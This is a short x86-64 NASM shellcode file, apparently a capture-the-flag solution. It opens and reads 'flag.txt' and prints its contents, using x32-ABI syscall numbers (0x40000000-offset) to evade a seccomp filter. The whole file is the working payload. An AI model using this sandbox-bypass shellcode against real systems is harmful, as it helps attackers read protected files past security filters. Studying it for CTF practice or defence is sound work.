BITS 64
global _start

section .text

_start:

call skip
filename: db "flag.txt", 0
skip:

pop rdi
xor rsi, rsi
mov rax, 0x40000002
syscall

mov rdi, rax
sub rsp, 64
lea rsi, [rsp]
mov rdx, 64
mov rax, 0x40000000
syscall

mov rdi, 1
mov rdx, rax
mov rax, 0x40000001
syscall

mov rax, 0x4000003c
xor rdi, rdi
syscall
